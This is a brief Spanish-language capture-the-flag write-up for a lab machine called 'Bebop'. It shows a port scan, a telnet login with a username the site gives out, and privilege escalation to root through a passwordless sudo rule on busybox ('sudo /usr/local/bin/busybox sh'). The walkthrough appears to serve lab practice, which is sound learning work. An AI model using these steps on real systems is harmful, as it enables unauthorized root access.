# Bebop
## Initial Scan 
```
22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
| ssh-hostkey: 
|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
|   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
|_  256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (ED25519)
23/tcp open  telnet  BSD-derived telnetd
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```
## Enum ?
En la propia pagina nos dan un usuario valido "pilot"

## Exploit/foothold
Nos conectaremos via telnet con el usuario que nos dieron
```
pj@crow-foot:~$ telnet 10.10.1.225 23
Trying 10.10.1.225...
Connected to 10.10.1.225.
Escape character is '^]'.
login: pilot
```
## Privesc 
```
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
```
Ejecutamos lo siguiente :
```
sudo /usr/local/bin/busybox sh
```
Y ya tenemos shell como root
